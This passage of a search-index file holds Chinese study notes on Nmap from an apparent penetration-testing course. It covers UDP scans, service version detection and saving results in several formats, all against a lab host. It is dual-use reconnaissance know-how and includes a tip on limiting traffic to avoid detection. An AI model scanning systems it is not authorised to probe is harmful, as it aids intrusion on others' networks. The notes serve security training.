\u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <p>\u4f5c\u4e3a\u54cd\u5e94\uff0c\u6211\u4eec\u6536\u5230<code>ICMP</code>\u5e26\u6709<code>type 3</code>\u548c \u7684\u56de\u590d<code>error code 3</code>\uff0c\u8fd9\u8868\u660e\u65e0\u6cd5\u8bbf\u95ee\u6240\u9700\u7684\u4e3b\u673a\u3002\u7136\u800c\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e3b\u673a\u662f\u6d3b\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f3a\u70c8\u5047\u8bbe\u8fd9\u4e2a\u7aef\u53e3\u4e0a\u7684\u9632\u706b\u5899\u62d2\u7edd\u4e86\u6570\u636e\u5305\uff0c\u6211\u4eec\u7a0d\u540e\u5fc5\u987b\u4ed4\u7ec6\u67e5\u770b\u8fd9\u4e2a\u7aef\u53e3\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#udp","title":"\u53d1\u73b0\u5f00\u653e\u7684 UDP \u7aef\u53e3","text":"<p>\u6709\u4e9b\u7cfb\u7edf\u7ba1\u7406\u5458\u6709\u65f6\u4f1a\u5fd8\u8bb0\u8fc7\u6ee4 TCP \u7aef\u53e3\u4e4b\u5916\u7684 UDP \u7aef\u53e3\u3002\u7531\u4e8e<code>UDP</code>\u662f\u4e00\u4e2a<code>stateless protocol</code>\u5e76\u4e14\u4e0d\u9700\u8981\u50cf TCP \u8fd9\u6837\u7684\u4e09\u5411\u63e1\u624b\u3002\u6211\u4eec\u6ca1\u6709\u6536\u5230\u4efb\u4f55\u786e\u8ba4\u3002\u56e0\u6b64\uff0c\u8d85\u65f6\u65f6\u95f4\u957f\u5f97\u591a\uff0c\u4f7f\u6574\u4e2a<code>UDP scan</code>( <code>-sU</code>) \u6bd4<code>TCP scan</code>( <code>-sS</code>) \u6162\u5f97\u591a\u3002</p> <p>\u8ba9\u6211\u4eec\u770b\u4e00\u4e2a UDP \u626b\u63cf ( ) \u7684\u793a\u4f8b<code>-sU</code>\u4ee5\u53ca\u5b83\u7ed9\u6211\u4eec\u7684\u7ed3\u679c\u3002</p> <p>\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -F -sU\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:01 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.059s latency).\nNot shown: 95 closed ports\nPORT     STATE         SERVICE\n68/udp   open|filtered dhcpc\n137/udp  open          netbios-ns\n138/udp  open|filtered netbios-dgm\n631/udp  open|filtered ipp\n5353/udp open          zeroconf\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 98.07 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-F</code> \u626b\u63cf\u524d 100 \u4e2a\u7aef\u53e3\u3002 <code>-sU</code> \u6267\u884c UDP \u626b\u63cf\u3002 <p>\u8fd9\u6837\u505a\u7684\u53e6\u4e00\u4e2a\u7f3a\u70b9\u662f\u6211\u4eec\u7ecf\u5e38\u5f97\u4e0d\u5230\u54cd\u5e94\uff0c\u56e0\u4e3a<code>Nmap</code>\u5411\u626b\u63cf\u7684 UDP \u7aef\u53e3\u53d1\u9001\u7a7a\u6570\u636e\u62a5\uff0c\u6211\u4eec\u6536\u4e0d\u5230\u4efb\u4f55\u54cd\u5e94\u3002\u6240\u4ee5\u6211\u4eec\u65e0\u6cd5\u786e\u5b9a UDP \u6570\u636e\u5305\u662f\u5426\u5df2\u7ecf\u5230\u8fbe\u3002\u5982\u679c UDP \u7aef\u53e3\u662f<code>open</code>\uff0c\u6211\u4eec\u53ea\u6709\u5728\u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u4e3a\u8fd9\u6837\u505a\u65f6\u624d\u4f1a\u6536\u5230\u54cd\u5e94\u3002</p> <p>\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 137 --reason \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:15 CEST\nSENT (0.0367s) UDP 10.10.14.2:55478 &gt; 10.129.2.28:137 ttl=57 id=9122 iplen=78\nRCVD (0.0398s) UDP 10.129.2.28:137 &gt; 10.10.14.2:55478 ttl=64 id=13222 iplen=257\nNmap scan report for 10.129.2.28\nHost is up, received user-set (0.0031s latency).\n\nPORT    STATE SERVICE    REASON\n137/udp open  netbios-ns udp-response ttl 64\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.04 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-sU</code> \u6267\u884c UDP \u626b\u63cf\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>-p 137</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>--reason</code> \u663e\u793a\u7aef\u53e3\u5904\u4e8e\u7279\u5b9a\u72b6\u6001\u7684\u539f\u56e0\u3002 <p>\u5982\u679c\u6211\u4eec\u6536\u5230\u4e00\u4e2a\u5e26\u6709\uff08\u7aef\u53e3\u4e0d\u53ef\u8fbe\uff09\u7684 ICMP \u54cd\u5e94<code>error code 3</code>\uff0c\u6211\u4eec\u5c31\u77e5\u9053\u8be5\u7aef\u53e3\u786e\u5b9e\u662f<code>closed</code>\u3002</p> <p>\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 100 --reason \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:25 CEST\nSENT (0.0445s) UDP 10.10.14.2:63825 &gt; 10.129.2.28:100 ttl=57 id=29925 iplen=28\nRCVD (0.1498s) ICMP [10.129.2.28 &gt; 10.10.14.2 Port unreachable (type=3/code=3) ] IP [ttl=64 id=11903 iplen=56 ]\nNmap scan report for 10.129.2.28\nHost is up, received user-set (0.11s latency).\n\nPORT    STATE  SERVICE REASON\n100/udp closed unknown port-unreach ttl 64\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in  0.15 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-sU</code> \u6267\u884c UDP \u626b\u63cf\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>-p 100</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>--reason</code> \u663e\u793a\u7aef\u53e3\u5904\u4e8e\u7279\u5b9a\u72b6\u6001\u7684\u539f\u56e0\u3002 <p>\u5bf9\u4e8e\u6240\u6709\u5176\u4ed6 ICMP \u54cd\u5e94\uff0c\u626b\u63cf\u7684\u7aef\u53e3\u6807\u8bb0\u4e3a ( <code>open|filtered</code>)\u3002</p> <p>\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 138 --reason \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:32 CEST\nSENT (0.0380s) UDP 10.10.14.2:52341 &gt; 10.129.2.28:138 ttl=50 id=65159 iplen=28\nSENT (1.0392s) UDP 10.10.14.2:52342 &gt; 10.129.2.28:138 ttl=40 id=24444 iplen=28\nNmap scan report for 10.129.2.28\nHost is up, received user-set.\n\nPORT    STATE         SERVICE     REASON\n138/udp open|filtered netbios-dgm no-response\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 2.06 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-sU</code> \u6267\u884c UDP \u626b\u63cf\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>-p 138</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>--reason</code> \u663e\u793a\u7aef\u53e3\u5904\u4e8e\u7279\u5b9a\u72b6\u6001\u7684\u539f\u56e0\u3002 <p>\u626b\u63cf\u7aef\u53e3\u7684\u53e6\u4e00\u79cd\u4fbf\u6377\u65b9\u6cd5\u662f<code>-sV</code>\u7528\u4e8e\u4ece\u6253\u5f00\u7684\u7aef\u53e3\u83b7\u53d6\u5176\u4ed6\u53ef\u7528\u4fe1\u606f\u7684\u9009\u9879\u3002\u6b64\u65b9\u6cd5\u53ef\u4ee5\u8bc6\u522b\u7248\u672c\u3001\u670d\u52a1\u540d\u79f0\u548c\u6709\u5173\u76ee\u6807\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p>\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -Pn -n --disable-arp-ping --packet-trace -p 445 --reason  -sV\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2022-11-04 11:10 GMT\nSENT (0.3426s) TCP 10.10.14.2:44641 &gt; 10.129.2.28:445 S ttl=55 id=43401 iplen=44  seq=3589068008 win=1024 &lt;mss 1460&gt;\nRCVD (0.3556s) TCP 10.129.2.28:445 &gt; 10.10.14.2:44641 SA ttl=63 id=0 iplen=44  seq=2881527699 win=29200 &lt;mss 1337&gt;\nNSOCK INFO [0.4980s] nsock_iod_new2(): nsock_iod_new (IOD #1)\nNSOCK INFO [0.4980s] nsock_connect_tcp(): TCP connection requested to 10.129.2.28:445 (IOD #1) EID 8\nNSOCK INFO [0.5130s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.2.28:445]\nService scan sending probe NULL to 10.129.2.28:445 (tcp)\nNSOCK INFO [0.5130s] nsock_read(): Read request from IOD #1 [10.129.2.28:445] (timeout: 6000ms) EID 18\nNSOCK INFO [6.5190s] nsock_trace_handler_callback(): Callback: READ TIMEOUT for EID 18 [10.129.2.28:445]\nService scan sending probe SMBProgNeg to 10.129.2.28:445 (tcp)\nNSOCK INFO [6.5190s] nsock_write(): Write request for 168 bytes to IOD #1 EID 27 [10.129.2.28:445]\nNSOCK INFO [6.5190s] nsock_read(): Read request from IOD #1 [10.129.2.28:445] (timeout: 5000ms) EID 34\nNSOCK INFO [6.5190s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 27 [10.129.2.28:445]\nNSOCK INFO [6.5320s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 34 [10.129.2.28:445] (135 bytes)\nService scan match (Probe SMBProgNeg matched with SMBProgNeg line 13836): 10.129.2.28:445 is netbios-ssn.  Version: |Samba smbd|3.X - 4.X|workgroup: WORKGROUP|\nNSOCK INFO [6.5320s] nsock_iod_delete(): nsock_iod_delete (IOD #1)\nNmap scan report for 10.129.2.28\nHost is up, received user-set (0.013s latency).\n\nPORT    STATE SERVICE     REASON         VERSION\n445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\nService Info: Host: Ubuntu\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.55 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>-p 445</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>--reason</code> \u663e\u793a\u7aef\u53e3\u5904\u4e8e\u7279\u5b9a\u72b6\u6001\u7684\u539f\u56e0\u3002 <code>-sV</code> \u6267\u884c\u670d\u52a1\u626b\u63cf\u3002 <p>\u6211\u4eec\u53ef\u4ee5\u5728\u4ee5\u4e0b\u4f4d\u7f6e\u627e\u5230\u6709\u5173\u7aef\u53e3\u626b\u63cf\u6280\u672f\u7684\u66f4\u591a\u4fe1\u606f\uff1ahttps ://nmap.org/book/man-port-scanning-techniques.html</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_14","title":"\u4fdd\u5b58\u7ed3\u679c","text":""},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_15","title":"\u4e0d\u540c\u7684\u683c\u5f0f","text":"<p>\u5f53\u6211\u4eec\u8fd0\u884c\u5404\u79cd\u626b\u63cf\u65f6\uff0c\u6211\u4eec\u5e94\u8be5\u59cb\u7ec8\u4fdd\u5b58\u7ed3\u679c\u3002\u7a0d\u540e\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u6765\u68c0\u67e5\u6211\u4eec\u4f7f\u7528\u7684\u4e0d\u540c\u626b\u63cf\u65b9\u6cd5\u4e4b\u95f4\u7684\u5dee\u5f02\u3002 <code>Nmap</code>\u53ef\u4ee5\u4ee5 3 \u79cd\u4e0d\u540c\u7684\u683c\u5f0f\u4fdd\u5b58\u7ed3\u679c\u3002</p> <ul> <li>\u6b63\u5e38\u8f93\u51fa( <code>-oN</code>) \u5e26<code>.nmap</code>\u6587\u4ef6\u6269\u5c55\u540d</li> <li>\u5e26\u6709\u6587\u4ef6\u6269\u5c55\u540d\u7684Grepable \u8f93\u51fa ( <code>-oG</code>)<code>.gnmap</code></li> <li>\u5e26\u6709\u6587\u4ef6\u6269\u5c55\u540d\u7684XML \u8f93\u51fa ( <code>-oX</code>)<code>.xml</code></li> </ul> <p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u6307\u5b9a\u9009\u9879 ( <code>-oA</code>) \u4ee5\u6240\u6709\u683c\u5f0f\u4fdd\u5b58\u7ed3\u679c\u3002\u8be5\u547d\u4ee4\u53ef\u80fd\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p- -oA target\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 12:14 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.0091s latency).\nNot shown: 65525 closed ports\nPORT      STATE SERVICE\n22/tcp    open  ssh\n25/tcp    open  smtp\n80/tcp    open  http\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 10.22 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p-</code> \u626b\u63cf\u6240\u6709\u7aef\u53e3\u3002 <code>-oA target</code> \u4ee5\u6240\u6709\u683c\u5f0f\u4fdd\u5b58\u7ed3\u679c\uff0c\u6bcf\u4e2a\u6587\u4ef6\u7684\u540d\u79f0\u4ee5\u201c\u76ee\u6807\u201d\u5f00\u5934\u3002 <p>\u5982\u679c\u6ca1\u6709\u7ed9\u51fa\u5b8c\u6574\u8def\u5f84\uff0c\u7ed3\u679c\u5c06\u5b58\u50a8\u5728\u6211\u4eec\u5f53\u524d\u6240\u5728\u7684\u76ee\u5f55\u4e2d\u3002\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u770b\u770b\u4e3a<code>Nmap</code>\u6211\u4eec\u521b\u5efa\u7684\u4e0d\u540c\u683c\u5f0f\u3002</p> <pre><code>darkinga@htb[/htb]$ ls\n\ntarget.gnmap target.xml  target.nmap\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_16","title":"\u6b63\u5e38\u8f93\u51fa","text":"<p>\u6b63\u5e38\u8f93\u51fa</p> <pre><code>darkinga@htb[/htb]$ cat target.nmap\n\n# Nmap 7.80 scan initiated Tue Jun 16 12:14:53 2020 as: nmap -p- -oA target 10.129.2.28\nNmap scan report for 10.129.2.28\nHost is up (0.053s latency).\nNot shown: 4 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n25/tcp open  smtp\n80/tcp open  http\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\n# Nmap done at Tue Jun 16 12:15:03 2020 -- 1 IP address (1 host up) scanned in 10.22 seconds\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#grepable","title":"Grepable \u8f93\u51fa","text":"<p>Grepable \u8f93\u51fa</p> <pre><code>darkinga@htb[/htb]$ cat target.gnmap\n\n# Nmap 7.80 scan initiated Tue Jun 16 12:14:53 2020 as: nmap -p- -oA target 10.129.2.28\nHost: 10.129.2.28 ()    Status: Up\nHost: 10.129.2.28 ()    Ports: 22/open/tcp//ssh///, 25/open/tcp//smtp///, 80/open/tcp//http///  Ignored State: closed (4)\n# Nmap done at Tue Jun 16 12:14:53 2020 -- 1 IP address (1 host up) scanned in 10.22 seconds\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#xml","title":"XML \u8f93\u51fa","text":"<p>XML \u8f93\u51fa</p> <pre><code>darkinga@htb[/htb]$ cat target.xml\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE nmaprun&gt;\n&lt;?xml-stylesheet href=\"file:///usr/local/bin/../share/nmap/nmap.xsl\" type=\"text/xsl\"?&gt;\n&lt;!-- Nmap 7.80 scan initiated Tue Jun 16 12:14:53 2020 as: nmap -p- -oA target 10.129.2.28 --&gt;\n&lt;nmaprun scanner=\"nmap\" args=\"nmap -p- -oA target 10.129.2.28\" start=\"12145301719\" startstr=\"Tue Jun 16 12:15:03 2020\" version=\"7.80\" xmloutputversion=\"1.04\"&gt;\n&lt;scaninfo type=\"syn\" protocol=\"tcp\" numservices=\"65535\" services=\"1-65535\"/&gt;\n&lt;verbose level=\"0\"/&gt;\n&lt;debugging level=\"0\"/&gt;\n&lt;host starttime=\"12145301719\" endtime=\"12150323493\"&gt;&lt;status state=\"up\" reason=\"arp-response\" reason_ttl=\"0\"/&gt;\n&lt;address addr=\"10.129.2.28\" addrtype=\"ipv4\"/&gt;\n&lt;address addr=\"DE:AD:00:00:BE:EF\" addrtype=\"mac\" vendor=\"Intel Corporate\"/&gt;\n&lt;hostnames&gt;\n&lt;/hostnames&gt;\n&lt;ports&gt;&lt;extraports state=\"closed\" count=\"4\"&gt;\n&lt;extrareasons reason=\"resets\" count=\"4\"/&gt;\n&lt;/extraports&gt;\n&lt;port protocol=\"tcp\" portid=\"22\"&gt;&lt;state state=\"open\" reason=\"syn-ack\" reason_ttl=\"64\"/&gt;&lt;service name=\"ssh\" method=\"table\" conf=\"3\"/&gt;&lt;/port&gt;\n&lt;port protocol=\"tcp\" portid=\"25\"&gt;&lt;state state=\"open\" reason=\"syn-ack\" reason_ttl=\"64\"/&gt;&lt;service name=\"smtp\" method=\"table\" conf=\"3\"/&gt;&lt;/port&gt;\n&lt;port protocol=\"tcp\" portid=\"80\"&gt;&lt;state state=\"open\" reason=\"syn-ack\" reason_ttl=\"64\"/&gt;&lt;service name=\"http\" method=\"table\" conf=\"3\"/&gt;&lt;/port&gt;\n&lt;/ports&gt;\n&lt;times srtt=\"52614\" rttvar=\"75640\" to=\"355174\"/&gt;\n&lt;/host&gt;\n&lt;runstats&gt;&lt;finished time=\"12150323493\" timestr=\"Tue Jun 16 12:14:53 2020\" elapsed=\"10.22\" summary=\"Nmap done at Tue Jun 16 12:15:03 2020; 1 IP address (1 host up) scanned in 10.22 seconds\" exit=\"success\"/&gt;&lt;hosts up=\"1\" down=\"0\" total=\"1\"/&gt;\n&lt;/runstats&gt;\n&lt;/nmaprun&gt;\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_17","title":"\u6837\u5f0f\u8868","text":"<p>\u901a\u8fc7 XML \u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u8f7b\u677e\u521b\u5efa\u6613\u4e8e\u9605\u8bfb\u7684 HTML \u62a5\u544a\uff0c\u5373\u4f7f\u5bf9\u4e8e\u975e\u6280\u672f\u4eba\u5458\u4e5f\u662f\u5982\u6b64\u3002\u8fd9\u5728\u4ee5\u540e\u5bf9\u6587\u6863\u975e\u5e38\u6709\u7528\uff0c\u56e0\u4e3a\u5b83\u4ee5\u8be6\u7ec6\u548c\u6e05\u6670\u7684\u65b9\u5f0f\u5c55\u793a\u4e86\u6211\u4eec\u7684\u7ed3\u679c\u3002\u8981\u5c06\u5b58\u50a8\u7684\u7ed3\u679c\u4ece XML \u683c\u5f0f\u8f6c\u6362\u4e3a HTML\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8be5\u5de5\u5177<code>xsltproc</code>\u3002</p> <p>XML \u8f93\u51fa</p> <pre><code>darkinga@htb[/htb]$ xsltproc target.xml -o target.html\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u73b0\u5728\u5728\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00 HTML \u6587\u4ef6\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u6e05\u6670\u4e14\u7ed3\u6784\u5316\u7684\u7ed3\u679c\u5c55\u793a\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#nmap_2","title":"Nmap\u62a5\u544a","text":"<p>\u6709\u5173\u8f93\u51fa\u683c\u5f0f\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u8bbf\u95ee\uff1ahttps ://nmap.org/book/output.html</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_18","title":"\u670d\u52a1\u679a\u4e3e","text":"<p>\u5bf9\u6211\u4eec\u6765\u8bf4\uff0c\u5c3d\u53ef\u80fd\u51c6\u786e\u5730\u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u53ca\u5176\u7248\u672c\u81f3\u5173\u91cd\u8981\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6b64\u4fe1\u606f\u626b\u63cf\u5df2\u77e5\u6f0f\u6d1e\uff0c\u5e76\u5728\u627e\u5230\u65f6\u5206\u6790\u8be5\u7248\u672c\u7684\u6e90\u4ee3\u7801\u3002\u786e\u5207\u7684\u7248\u672c\u53f7\u4f7f\u6211\u4eec\u80fd\u591f\u641c\u7d22\u9002\u5408\u76ee\u6807\u670d\u52a1\u548c\u64cd\u4f5c\u7cfb\u7edf\u7684\u66f4\u7cbe\u786e\u7684\u6f0f\u6d1e\u5229\u7528\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_19","title":"\u670d\u52a1\u7248\u672c\u68c0\u6d4b","text":"<p>\u5efa\u8bae\u9996\u5148\u6267\u884c\u5feb\u901f\u7aef\u53e3\u626b\u63cf\uff0c\u8fd9\u53ef\u4ee5\u8ba9\u6211\u4eec\u5927\u81f4\u4e86\u89e3\u53ef\u7528\u7aef\u53e3\u3002\u8fd9\u4f1a\u663e\u7740\u51cf\u5c11\u6d41\u91cf\uff0c\u8fd9\u5bf9\u6211\u4eec\u6765\u8bf4\u662f\u6709\u5229\u7684\uff0c\u5426\u5219\u6211\u4eec\u53ef\u80fd\u4f1a\u88ab\u5b89\u5168\u673a\u5236\u53d1\u73b0\u5e76\u963b\u6b62\u3002\u6211\u4eec\u53ef\u4ee5\u5148\u5904\u7406\u8fd9\u4e9b\u5e76\u5728\u540e\u53f0\u8fd0\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u5b83\u4f1a\u663e\u793a\u6240\u6709\u6253\u5f00\u7684\u7aef\u53e3 ( <code>-p-</code>)\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7248\u672c\u626b\u63cf\u6765\u626b\u63cf\u670d\u52a1\u53ca\u5176\u7248\u672c\u7684\u7279\u5b9a\u7aef\u53e3\uff08<code>-sV</code>\uff09\u3002</p> <p>\u5b8c\u6574\u7684\u7aef\u53e3\u626b\u63cf\u9700\u8981\u76f8\u5f53\u957f\u7684\u65f6\u95f4\u3002\u8981\u67e5\u770b\u626b\u63cf\u72b6\u6001\uff0c\u6211\u4eec\u53ef\u4ee5\u5728<code>[Space Bar]</code>\u626b\u63cf\u8fc7\u7a0b\u4e2d\u6309 \uff0c\u8fd9\u5c06\u5bfc\u81f4<code>Nmap</code>\u5411\u6211\u4eec\u663e\u793a\u626b\u63cf\u72b6\u6001\u3002</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p- -sV\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 19:44 CEST\n[Space Bar]\nStats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 3.64% done; ETC: 19:45 (0:00:53 remaining)\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p-</code> \u626b\u63cf\u6240\u6709\u7aef\u53e3\u3002 <code>-sV</code> \u5bf9\u6307\u5b9a\u7aef\u53e3\u8fdb\u884c\u670d\u52a1\u7248\u672c\u68c0\u6d4b\u3002 <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7684\u53e6\u4e00\u4e2a\u9009\u9879 ( <code>--stats-every=5s</code>) \u662f\u5b9a\u4e49\u5e94\u663e\u793a\u72b6\u6001\u7684\u65f6\u95f4\u6bb5\u3002\u5728\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u6307\u5b9a\u79d2\u6570 ( <code>s</code>) \u6216\u5206\u949f\u6570 ( <code>m</code>)\uff0c\u5728\u6b64\u4e4b\u540e\u6211\u4eec\u60f3\u8981\u83b7\u53d6\u72b6\u6001\u3002</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p- -sV --stats-every=5s\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 19:46 CEST\nStats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 13.91% done; ETC: 19:49 (0:00:31 remaining)\nStats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 39.57% done; ETC: 19:48 (0:00:15 remaining)\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p-</code> \u626b\u63cf\u6240\u6709\u7aef\u53e3\u3002 <code>-sV</code> 